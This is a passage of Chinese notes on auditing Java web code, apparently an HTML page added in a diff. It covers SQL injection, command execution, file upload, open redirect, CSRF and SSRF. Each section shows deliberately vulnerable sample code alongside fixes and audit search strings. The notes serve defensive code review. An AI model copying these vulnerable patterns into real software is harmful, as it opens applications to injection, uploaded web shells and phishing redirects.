+MyBatis 框架可应用于需求多变的互联网项目，如电商项目；Hibernate 框架可应用于需求明确、业务固定的项目，如 OA 项目、ERP 项目等。
+</p>
+
+<p>
+MyBatis 3 中文文档：<a href="https://mybatis.org/mybatis-3/zh/">https://mybatis.org/mybatis-3/zh/</a>
+</p>
+</div>
+<div id="outline-container-h:2aad10ff-ece9-401e-ac8a-fc8566cc6382" class="outline-5">
+<h5 id="h:2aad10ff-ece9-401e-ac8a-fc8566cc6382"><a href="#h:2aad10ff-ece9-401e-ac8a-fc8566cc6382">MyBatis 示例</a></h5>
+<div class="outline-text-5" id="text-h:2aad10ff-ece9-401e-ac8a-fc8566cc6382">
+<p>
+MyBatis 使用 XML 定义语句的方式，MyBatis 提供的所有特性都可以利用基于 XML 的映射语言来实现。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="UTF-8" </span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+&lt;!<span class="org-nxml-text">DOCTYPE mapper
+PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
+"http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">mapper</span> <span class="org-nxml-attribute-local-name">namespace</span>=<span class="org-string">"org.mybatis.example.BlogMapper"</span><span class="org-nxml-tag-delimiter">&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">select</span> <span class="org-nxml-attribute-local-name">id</span>=<span class="org-string">"selectBlog"</span> <span class="org-nxml-attribute-local-name">resultType</span>=<span class="org-string">"Blog"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+select * from Blog where id = ${id} # &#25340;&#25509;
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">select</span><span class="org-nxml-tag-delimiter">&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">select</span> <span class="org-nxml-attribute-local-name">id</span>=<span class="org-string">"selectBlog"</span> <span class="org-nxml-attribute-local-name">resultType</span>=<span class="org-string">"Blog"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+select * from Blog where id = #{id} # &#39044;&#32534;&#35793;
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">select</span><span class="org-nxml-tag-delimiter">&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">mapper</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-text">// Mybatis like
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">select</span> <span class="org-nxml-attribute-local-name">id</span>=<span class="org-string">"findUserByLikeName1"</span> <span class="org-nxml-attribute-local-name">parameterType</span>=<span class="org-string">"java.lang.String"</span> <span class="org-nxml-attribute-local-name">resultMap</span>=<span class="org-string">"user"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+select * from t_user where name like '%${name}%'
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">select</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+
+// Mybatis like &#20351;&#29992;&#39044;&#32534;&#35793;
+select * from user where name like concat('%', #{name}, '%')</span>
+</pre>
+</div>
+
+<p>
+如果用的Mybatis构架，一般在resource目录下有mappers/*.xml文件。
+</p>
+<ul class="org-ul">
+<li>代码接口中的函数名和xml中的id属性值是一一对应的，实现是在xml中实现。</li>
+</ul>
+
+<p>
+vscode 插件- MybatisPlus，方便跳到xml文件。
+</p>
+
+<p>
+审计示例
+</p>
+<ul class="org-ul">
+<li>在controller目录中找代码，看看哪些是string类型输入参数</li>
+<li>跟踪下去，一直到xml中sql。</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-h:39836fa6-995b-4c0a-948f-a6211e7179fc" class="outline-4">
+<h4 id="h:39836fa6-995b-4c0a-948f-a6211e7179fc"><a href="#h:39836fa6-995b-4c0a-948f-a6211e7179fc">JdbcTemplate</a></h4>
+<div class="outline-text-4" id="text-h:39836fa6-995b-4c0a-948f-a6211e7179fc">
+<p>
+Spring JDBC 提供了多个实用的数据库访问工具，以简化 JDBC 的开发，其中使用最多就是 JdbcTemplate。
+</p>
+
+<p>
+JdbcTemplate 是 Spring JDBC 核心包（core）中的核心类，它可以通过配置文件、注解、Java 配置类等形式获取数据库的相关信息，实现了对 JDBC 开发过程中的驱动加载、连接的开启和关闭、SQL 语句的创建与执行、异常处理、事务处理、数据类型转换等操作的封装。我们只要对其传入SQL 语句和必要的参数即可轻松进行 JDBC 编程。
+</p>
+
+<p>
+JdbcTemplate 的全限定命名为 org.springframework.jdbc.core.JdbcTemplate，它提供了大量的查询和更新数据库的方法，如下表所示。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#26041;&#27861; &#35828;&#26126;
+public int update(String sql)
+&#29992;&#20110;&#25191;&#34892;&#26032;&#22686;&#12289;&#26356;&#26032;&#12289;&#21024;&#38500;&#31561;&#35821;&#21477;&#65307;sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340;SQL &#35821;&#21477;&#65307;args &#34920;&#31034;&#38656;&#35201;&#20256;&#20837;&#21040; SQL &#35821;&#21477;&#20013;&#30340;&#21442;&#25968;&#12290;
+
+public int update(String sql,Object... args)
+
+public void execute(String sql)
+&#21487;&#20197;&#25191;&#34892;&#20219;&#24847; SQL&#65292;&#19968;&#33324;&#29992;&#20110;&#25191;&#34892; DDL &#35821;&#21477;&#65307; sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340; SQL &#35821;&#21477;&#65307;action &#34920;&#31034;&#25191;&#34892;&#23436; SQL &#35821;&#21477;&#21518;&#65292;&#35201;&#35843;&#29992;&#30340;&#20989;&#25968;&#12290;
+
+public T execute(String sql,PreparedStatementCallback action)
+
+public List query(String sql, RowMapperrowMapper, @Nullable Object... args)
+
+&#29992;&#20110;&#25191;&#34892;&#26597;&#35810;&#35821;&#21477;&#65307;sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340; SQL &#35821;&#21477;&#65307;rowMapper&#65306;&#29992;&#20110;&#30830;&#23450;&#36820;&#22238;&#30340;&#38598;&#21512;&#65288;List&#65289;&#30340;&#31867;&#22411;&#65307;args&#65306;&#34920;&#31034;&#38656;&#35201;&#20256;&#20837;&#21040; SQL &#35821;&#21477;&#30340;&#21442;&#25968;&#12290;
+
+public T queryForObject(String sql,RowMapper rowMapper, @Nullable Object... args)
+
+public int[] batchUpdate(String sql,List&lt;Object[]&gt; batchArgs, final int[] argTypes)
+
+&#29992;&#20110;&#25209;&#37327;&#25191;&#34892;&#26032;&#22686;&#12289;&#26356;&#26032;&#12289;&#21024;&#38500;&#31561;&#35821;&#21477;&#65307; sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340; SQL &#35821;&#21477;&#65307;argTypes&#65306;&#38656;&#35201;&#27880;&#20837;&#30340; SQL &#21442;&#25968;&#30340; JDBC&#31867;&#22411;&#65307;batchArgs&#65306;&#34920;&#31034;&#38656;&#35201;&#20256;&#20837;&#21040; SQL &#35821;&#21477;&#30340;&#21442;&#25968;&#12290;
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">String</span> <span class="org-variable-name">sql1</span>=<span class="org-string">"select * from users where user = ? "</span>;
+<span class="org-type">PreparedStatement</span> <span class="org-variable-name">preparedStatement1</span> = con.prepareStatement(sql1);
+preparedStatement1.setString(1, user);
+<span class="org-type">ResultSet</span> <span class="org-variable-name">re</span> = preparedStatement1.executeQuery();
+<span class="org-keyword">while</span> (re.next()) {
+    System.out.println(re.getString(<span class="org-string">"user"</span>));
+}
+</pre>
+</div>
+
+<p>
+搜索与 Java 数据库相关的代码应该有助于查明被审计的应用程序的持久层中涉及的类和方法
+</p>
+
+<p>
+要搜索的字符串
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">java.sql.Connection.prepareStatement
+java.sql.ResultSet.getObject
+<span class="org-keyword">select</span>
+insert
+java.sql.Statement.executeUpdate
+java.sql.Statement.addBatch
+java.sql.Statement.executeQuery
+java.sql.Statement.execute
+execute
+executestatement
+createStatement
+java.sql.ResultSet.getString
+executeQuery
+jdbc
+delete
+update
+java.sql.Connection.prepareCall
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:be043971-0d53-4e05-97de-5375c0acf721" class="outline-3">
+<h3 id="h:be043971-0d53-4e05-97de-5375c0acf721"><a href="#h:be043971-0d53-4e05-97de-5375c0acf721">解决方案</a></h3>
+<div class="outline-text-3" id="text-h:be043971-0d53-4e05-97de-5375c0acf721">
+<p>
+使用预处理执行 SQL 语句，对所有传入 SQL 语句中的变量，做绑定。这样，用户拼接进来的变量，无论内容是什么，都会被当做替代符号“?”所替代的值，数据库也不 会把恶意用户拼接进来的数据，当做部分 SQL 语句去解析。
+</p>
+
+<p>
+示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-constant">com</span>.<span class="org-constant">mysql</span>.<span class="org-constant">jdbc</span>.<span class="org-type">Connection</span> <span class="org-variable-name">conn</span> = <span class="org-constant">db</span>.JdbcConnection.getConn();
+
+<span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">sql</span> = <span class="org-string">"select * from product where pname like ?"</span>;
+
+<span class="org-constant">java</span>.<span class="org-constant">sql</span>.<span class="org-type">PreparedStatement</span> <span class="org-variable-name">ps</span> = (<span class="org-constant">java</span>.<span class="org-constant">sql</span>.<span class="org-type">PreparedStatement</span>)
+conn.prepareStatement(sql);
+
+ps.setObject(1, <span class="org-string">"%"</span>+request.getParameter(<span class="org-string">"pname"</span>)+<span class="org-string">"%"</span>);
+<span class="org-type">ResultSet</span> <span class="org-variable-name">rs</span> = ps.executeQuery();
+</pre>
+</div>
+
+<p>
+无论使用了哪个 ORM 框架，都会支持用户自定义拼接语句，经常有人误解 Hibernate 没有这个漏洞，其实Hibernate 也支持用户执行 JDBC 查询，并且支持用户把变量拼接到SQL 语句中。
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:2820635d-23ab-4b5f-9349-8538aeeb767a" class="outline-2">
+<h2 id="h:2820635d-23ab-4b5f-9349-8538aeeb767a"><a href="#h:2820635d-23ab-4b5f-9349-8538aeeb767a">命令执行</a></h2>
+<div class="outline-text-2" id="text-h:2820635d-23ab-4b5f-9349-8538aeeb767a">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+Code injection，代码注入攻击
+</p>
+
+<p>
+web 应用代码中，允许接收用户输入一段代码，之后在 web 应用服务器上执行这段代码，并返回给用户。
+</p>
+
+<p>
+由于用户可以自定义输入一段代码，在服务器上执行，所以恶意用户可以写一个远 程控制木马，直接获取服务器控制权限，所有服务器上的资源都会被恶意用户获取和修 改，甚至可以直接控制数据库。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+Java执行系统命令函数
+</p>
+<ul class="org-ul">
+<li>java.lang.Runtime</li>
+<li>java.lang.ProcessBuilder</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-comment-delimiter">// </span><span class="org-comment">java.lang.Runtime
+</span><span class="org-type">Process</span> <span class="org-variable-name">process</span> = Runtime.getRuntime().exec(command);
+process.getOutputStream().close();
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">ProcessBuilder</span> <span class="org-variable-name">processBuilder</span> = <span class="org-keyword">new</span> <span class="org-type">ProcessBuilder</span>();
+
+processBuilder.command(<span class="org-string">"bash"</span>, <span class="org-string">"-c"</span>, cmd); <span class="org-comment-delimiter">//</span><span class="org-comment">command&#21482;&#33021;&#36816;&#34892;&#19968;&#26465;&#21629;&#20196;&#12290;&#20250;&#25226;cmd&#24403;&#21442;&#25968;
+</span>
+<span class="org-type">BufferedReader</span> <span class="org-variable-name">reader</span> = <span class="org-keyword">new</span> <span class="org-type">BufferedReader</span>(<span class="org-keyword">new</span> <span class="org-type">InputStreamReader</span>(processBuilder.start().getInputStream(), <span class="org-constant">StandardCharsets</span>.UTF_8));
+<span class="org-keyword">while</span> ((line = reader.readLine()) != <span class="org-constant">null</span>) {
+    System.out.println(line);
+}
+reader.close();
+</pre>
+</div>
+</div>
+<div id="outline-container-h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3" class="outline-3">
+<h3 id="h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3"><a href="#h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3">解决方案</a></h3>
+<div class="outline-text-3" id="text-h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3">
+<p>
+不直接使用用户输入的参数传入命令执行函数中，或对传入的参数进行过滤，仅允许传入字母、数字、下划线等必要字符。（禁止传入|、&amp;、;、&amp;&amp;、||、&lt;、&gt;等特殊字符）
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:ac2013bf-c814-4784-b33d-8264861dc612" class="outline-2">
+<h2 id="h:ac2013bf-c814-4784-b33d-8264861dc612"><a href="#h:ac2013bf-c814-4784-b33d-8264861dc612">文件上传</a></h2>
+<div class="outline-text-2" id="text-h:ac2013bf-c814-4784-b33d-8264861dc612">
+<p>
+<b>名称定义</b>
+</p>
+
+<p>
+File upload，任意文件上传攻击。
+</p>
+
+<p>
+Web 应用程序在处理用户上传的文件时，没有判断文件的扩展名是否在允许的范围内，就把文件保存在服务器上，导致恶意用户可以上传任意文件，甚至上传脚本木马到web 服务器上，直接控制 web 服务器。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+读取文件函数：
+</p>
+<ul class="org-ul">
+<li>getInputStream()/FileOutputStream()</li>
+<li>getOriginalFilename()</li>
+<li>FileWriter</li>
+<li>File</li>
+<li>或查找 filename 相关的关键字进行检索；</li>
+</ul>
+
+
+<p>
+处理用户上传文件请求的代码，这段代码没有过滤文件扩展名。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">TUser</span> {
+    <span class="org-type">PrintWriter</span> <span class="org-variable-name">pw</span> = <span class="org-keyword">new</span> <span class="org-type">PrintWriter</span>(<span class="org-keyword">new</span> <span class="org-type">BufferedWriter</span>(<span class="org-keyword">new</span> <span class="org-type">FileWriter</span>(
+                request.getRealPath(<span class="org-string">"/"</span>)+getFIlename(request))));
+    <span class="org-type">ServletInputStream</span> <span class="org-variable-name">in</span> = request.getInputStream(); <span class="org-type">int</span> <span class="org-variable-name">i</span> = in.read();
+    <span class="org-keyword">while</span> (i != -1) {
+        pw.print((<span class="org-type">char</span>) i); i = in.read();
+    }
+    pw.close();
+}
+
+<span class="org-c-annotation">@Controller</span>
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">UploadFile</span> {
+    <span class="org-c-annotation">@PostMapping</span>(<span class="org-string">"/upload"</span>)
+    <span class="org-keyword">public</span> <span class="org-type">String</span> <span class="org-function-name">uploadFile</span>(<span class="org-c-annotation">@RequestParam</span>(<span class="org-string">"uploadfile"</span>)<span class="org-type">MultipartFile</span> <span class="org-variable-name">file</span>){
+        <span class="org-comment-delimiter">//</span><span class="org-comment">&#33719;&#21462;&#25991;&#20214;&#21517;
+</span>        <span class="org-type">String</span> <span class="org-variable-name">filename</span> = file.getOriginalFilename();
+        <span class="org-comment-delimiter">//</span><span class="org-comment">&#25991;&#20214;&#20445;&#23384;&#36335;&#24452;
+</span>        <span class="org-type">String</span> <span class="org-variable-name">path</span>=<span class="org-string">"/var/www/html/cici/upload"</span>;
+        <span class="org-type">File</span> <span class="org-variable-name">outfile</span> = <span class="org-keyword">new</span> <span class="org-type">File</span>(path + filename);
+        <span class="org-keyword">try</span> {
+            file.transferTo(outfile);
+        }<span class="org-keyword">catch</span> (IOException e){
+            e.printStackTrace();
+        }
+        <span class="org-keyword">return</span> <span class="org-string">"success"</span>;
+    }
+}
+</pre>
+</div>
+
+<p>
+审计点：
+</p>
+<ol class="org-ol">
+<li>查看文件写入路径是否可以被用户控制</li>
+<li>查看是否限制文件后缀</li>
+</ol>
+</div>
+<div id="outline-container-h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52" class="outline-3">
+<h3 id="h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52"><a href="#h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52">解决方案</a></h3>
+<div class="outline-text-3" id="text-h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52">
+<p>
+处理用户上传文件，要做以下检查：
+</p>
+<ol class="org-ol">
+<li>检查上传文件扩展名白名单，不属于白名单内，不允许上传。</li>
+<li>上传文件的目录必须是 http 请求无法直接访问到的。如果需要访问的，必须上传到其他（和 web 服务器不同的）域名下，并设置该目录为不解析 jsp 等脚本语言的目录。</li>
+<li>上传文件要保存的文件名和目录名由系统根据时间生成，不允许用户自定义。</li>
+</ol>
+</div>
+</div>
+</section>
+<section id="outline-container-h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a" class="outline-2">
+<h2 id="h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a"><a href="#h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a">重定向</a></h2>
+<div class="outline-text-2" id="text-h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+URL redirect，URL 跳转攻击。
+</p>
+
+<p>
+Web 应用程序接收到用户提交的 URL 参数后，没有对参数做“可信任 URL”的验证， 就向用户浏览器返回跳转到该URL 的指令。
+</p>
+
+<p>
+如果某个 web 应用程序存在这个漏洞，恶意攻击者可以发送给用户一个链接，但是用户打开后，却来到钓鱼网站页面，将会导致用户被钓鱼攻击，账号被盗，或账号相关财产被盗。
+</p>
+
+<p>
+URL跳转相关函数：
+</p>
+<ul class="org-ul">
+<li>sendRedirect()</li>
+<li>redirect()</li>
+<li>forward()</li>
+<li>setHeader()</li>
+</ul>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+这是一段没有验证目的地址，就直接跳转的经典代码：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">if</span>(checklogin(request)){
+  response.sendRedirect(request.getParameter(<span class="org-string">"url"</span>));
+}
+</pre>
+</div>
+
+<p>
+这段代码存在 URL 跳转漏洞，当用户登陆成功后，会跳转到 url 参数所指向的地址。
+</p>
+
+<p>
+使用SpringMVC时使用 redirect 开头的字符串，可以起到重定向作用
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-type">String</span> <span class="org-function-name">redirect</span>(){
+  <span class="org-keyword">return</span><span class="org-string">"redirect:http://www.baidu.com"</span>;
+}
+</pre>
+</div>
+</div>
+<div id="outline-container-h:ed9622ff-b2dd-4fa3-b12b-96288f415437" class="outline-3">
+<h3 id="h:ed9622ff-b2dd-4fa3-b12b-96288f415437"><a href="#h:ed9622ff-b2dd-4fa3-b12b-96288f415437">解决方案</a></h3>
+<div class="outline-text-3" id="text-h:ed9622ff-b2dd-4fa3-b12b-96288f415437">
+<ul class="org-ul">
+<li>为了保证用户所点击的 URL，是从 web 应用程序中生成的 URL，所以要做 TOKEN 验证。</li>
+<li>如果应用只有跳转网站的需求，可以设置白名单，判断目的地址是否在白名单列表中，如果不在列表中，就判定为URL 跳转攻击，并记录日志。不允许配置集团以外网站到白名单列表中。</li>
+</ul>
+
+<p>
+这两个方案都可以保证所有在应用中发出的重定向地址，都是可信任的地址。
+</p>
+
+<p>
+<b>注意：设置白名单时要注意进行后缀匹配</b>
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc" class="outline-2">
+<h2 id="h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc"><a href="#h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc">CSRF</a></h2>
+<div class="outline-text-2" id="text-h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+Cross-Site Request Forgery（CSRF），跨站请求伪造攻击。
+</p>
+
+<p>
+攻击者在用户浏览网页时，利用页面元素（例如 img 的 src），强迫受害者的浏览器向 Web 应用程序发送一个改变用户信息的请求。
+</p>
+
+<p>
+由于发生 CSRF 攻击后，攻击者是强迫用户向服务器发送请求，所以会造成用户信息被迫修改，更严重者引发蠕虫攻击。
+</p>
+
+<p>
+CSRF 攻击可以从站外和站内发起。从站内发起 CSRF 攻击，需要利用网站本身的业务，比如“自定义头像”功能，恶意用户指定自己的头像 URL 是一个修改用户信息的链接，当其他已登录用户浏览恶意用户头像时，会自动向这个链接发送修改信息请求。
+</p>
+
+<p>
+从站外发送请求，则需要恶意用户在自己的服务器上，放一个自动提交修改个人信 息的 htm 页面，并把页面地址发给受害者用户，受害者用户打开时，会发起一个请求。
+</p>
+
+<p>
+如果恶意用户能够知道网站管理后台某项功能的 URL，就可以直接攻击管理员，强迫管理员执行恶意用户定义的操作。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+一个没有 CSRF 安全防御的代码如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-type">void</span> <span class="org-function-name">csrfTest</span>(<span class="org-type">HttpServletRequest</span> <span class="org-variable-name">request</span>, <span class="org-type">HttpServletResponse</span> <span class="org-variable-name">response</span>) {
+    <span class="org-type">int</span> <span class="org-variable-name">userid</span>=Integer.valueOf(request.getSession().getAttribute(<span class="org-string">"userid"</span>).toString());
+    <span class="org-type">String</span> <span class="org-variable-name">email</span>=request.getParameter(<span class="org-string">"email"</span>);
+    <span class="org-type">String</span> <span class="org-variable-name">tel</span>=request.getParameter(<span class="org-string">"tel"</span>);
+    <span class="org-type">String</span> <span class="org-variable-name">ciciName</span>=request.getParameter(<span class="org-string">"student_name"</span>); <span class="org-type">Object</span>[] <span class="org-variable-name">params</span> = <span class="org-keyword">new</span> <span class="org-type">Object</span>[4];
+    params[0] = email;
+    params[1] = tel;
+    params[2] = realname;
+    params[3] = userid;
+    <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">sql</span> = <span class="org-string">"update user set email=?,tel=?,realname=? where userid=?"</span>;
+    conn.execUpdate(sql,params);
+</pre>
+</div>
+
+<p>
+代码中接收用户提交的参数“email,tel,realname”，之后修改了该用户的数据，一 旦接收到一个用户发来的请求，就执行修改操作。
+</p>
+
+<p>
+提交表单代码：
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span class="org-function-name">form</span> <span class="org-variable-name">action</span>=<span class="org-string">"http://localhost/servlet/modify"</span> <span class="org-variable-name">method</span>=<span class="org-string">"POST"</span>&gt;
+&lt;<span class="org-function-name">input</span> <span class="org-variable-name">name</span>=<span class="org-string">"email"</span>&gt;
+&lt;<span class="org-function-name">input</span> <span class="org-variable-name">name</span>=<span class="org-string">"tel"</span>&gt;
+&lt;<span class="org-function-name">input</span> <span class="org-variable-name">name</span>=<span class="org-string">"student_name"</span>&gt;
+&lt;<span class="org-function-name">input</span> <span class="org-variable-name">name</span>=<span class="org-string">"userid"</span>&gt;
+&lt;<span class="org-function-name">input</span> <span class="org-variable-name">type</span>=<span class="org-string">"submit"</span>&gt;
+&lt;/<span class="org-function-name">form</span>&gt;
+</pre>
+</div>
+
+<p>
+当用户点提交时，就会触发修改操作。
+</p>
+
+<p>
+<b>审计时需要关注系统敏感功能逻辑，例如：增删改查、支付等</b>
+</p>
+
+<p>
+当是个敏感功能时要加csrf防御。
+</p>
+</div>
+<div id="outline-container-h:ac2295cd-c04f-44e9-8a4c-0cd06f188802" class="outline-3">
+<h3 id="h:ac2295cd-c04f-44e9-8a4c-0cd06f188802"><a href="#h:ac2295cd-c04f-44e9-8a4c-0cd06f188802">解决方案</a></h3>
+<div class="outline-text-3" id="text-h:ac2295cd-c04f-44e9-8a4c-0cd06f188802">
+<ol class="org-ol">
+<li>在用户登陆时，设置一个 CSRF 的随机 TOKEN，同时种植在用户的 cookie 中， 当用户浏览器关闭、或用户再次登录、或退出时，清除 token。</li>
+<li>在表单中，生成一个隐藏域，它的值就是 COOKIE 中随机 TOKEN。</li>
+<li><p>
+表单被提交后，就可以在接收用户请求的 web 应用中，判断表单中的 TOKEN 值是否和用户 COOKIE 中的TOKEN 值一致，如果不一致或没有这个值，就判断为 CSRF 攻击，同时记录攻击日志（日志内容见“Error Handingand Logging” 章节）。
+</p>
+
+<p>
+由于攻击者无法预测每一个用户登录时生成的那个随机 TOKEN 值，所以无法伪造这个参数。
+</p>
+
+<p>
+示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span class="org-function-name">form</span> <span class="org-variable-name">method</span>=<span class="org-string">"post"</span> <span class="org-variable-name">id</span>=<span class="org-string">"xxxx"</span> <span class="org-variable-name">name</span>=<span class="org-string">"xxxx"</span> <span class="org-variable-name">style</span>=<span class="org-string">"margin:0px;"</span>&gt;
+$csrfToken.hiddenField
+...
+&lt;/<span class="org-function-name">form</span>&gt;
+</pre>
+</div>
+<p>
+代码中$csrfToken.hiddenField 将会生成一个隐藏域，用于生成验证 token，它将会作为表单的其提交。
+</p></li>
+
+<li>验证referer
+<ul class="org-ul">
+<li>注意验证 referer 有可能会被绕过</li>
+<li>同一网站中如果有其他漏洞配合或一些特殊情况下，也可以发出的 CSRF 攻击。</li>
+</ul></li>
+</ol>
+
+<p>
+其他修复方案：加验证码、自定义请求头等
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:07737c63-bf26-405b-bd89-d8691505ea91" class="outline-2">
+<h2 id="h:07737c63-bf26-405b-bd89-d8691505ea91"><a href="#h:07737c63-bf26-405b-bd89-d8691505ea91">SSRF</a></h2>
+<div class="outline-text-2" id="text-h:07737c63-bf26-405b-bd89-d8691505ea91">
+<p>
+SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
+</p>
+
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。
+</p>
+
+<ol class="org-ol">
+<li>扫描内网开放服务</li>
+<li>向内部任意主机的任意端口发送payload来攻击内网服务</li>
+<li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li>
+<li>攻击内网的web应用，例如直接SQL注入、XSS攻击等。内网的服务一般安全性较差。</li>
+<li>利用file、gopher、dict协议读取本地文件、执行命令等</li>
+</ol>
+
+<p>
+敏感函数：
+</p>
+<ul class="org-ul">
+<li>Httpclient.execute()</li>
+<li>HttpURLConnection.connect()</li>
+<li>URL.openStream()</li>
+<li>URLConnection.openConnection()</li>
+</ul>
+
+<p>
+<b>示例代码</b>
+</p>
+
+<ol class="org-ol">
+<li><p>
+Httpclient.execute() 函数
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">HttpGet</span> <span class="org-variable-name">httppost</span> = <span class="org-keyword">new</span> <span class="org-type">HttpGet</span>(Geocode.url + <span class="org-string">"/"</span> + ip);
+<span class="org-type">HttpClient</span> <span class="org-variable-name">httpclient</span> = <span class="org-keyword">new</span> <span class="org-type">DefaultHttpClient</span>();
+<span class="org-type">HttpResponse</span> <span class="org-variable-name">response</span> = httpclient.execute(httppost);
+</pre>
+</div></li>
+
+<li><p>
+HttpURLConnection.connect() 函数
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">URL</span> <span class="org-variable-name">url</span> = <span class="org-keyword">new</span> <span class="org-type">URL</span>(<span class="org-string">"http://www.cici.com/login.do?username=admin&amp;password=admin"</span>);
+<span class="org-comment-delimiter">// </span><span class="org-comment">&#24471;&#21040;&#32593;&#32476;&#35775;&#38382;&#23545;&#35937;java.net.HttpURLConnection
+</span>httpURLConnection = (<span class="org-type">HttpURLConnection</span>) url.openConnection();
+<span class="org-comment-delimiter">// </span><span class="org-comment">&#36830;&#25509;
+</span>httpURLConnection.connect();
+</pre>
+</div></li>
+
+<li><p>
+URL.openStream() 函数
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">URL</span> <span class="org-variable-name">url</span> = <span class="org-keyword">new</span> <span class="org-type">URL</span>(<span class="org-string">"http://www.cici.com"</span>);
+<span class="org-type">InputStream</span> <span class="org-variable-name">is</span> = url.openStream();
+<span class="org-type">InputStreamReader</span> <span class="org-variable-name">isr</span> = <span class="org-keyword">new</span> <span class="org-type">InputStreamReader</span>(is,<span class="org-string">"utf-8"</span>);
+<span class="org-type">BufferedReader</span> <span class="org-variable-name">br</span> = <span class="org-keyword">new</span> <span class="org-type">BufferedReader</span>(isr);
+<span class="org-type">String</span> <span class="org-variable-name">data</span> = br.readLine();
+<span class="org-keyword">while</span>(data != <span class="org-constant">null</span>){
+    System.out.println(data);
+    data = br.readLine();
+}
+br.close();
+isr.close();
+is.close();
+</pre>
+</div></li>
+
+<li><p>
+URLConnection.openConnection() 函数
+</p>
+<div class="org-src-container">
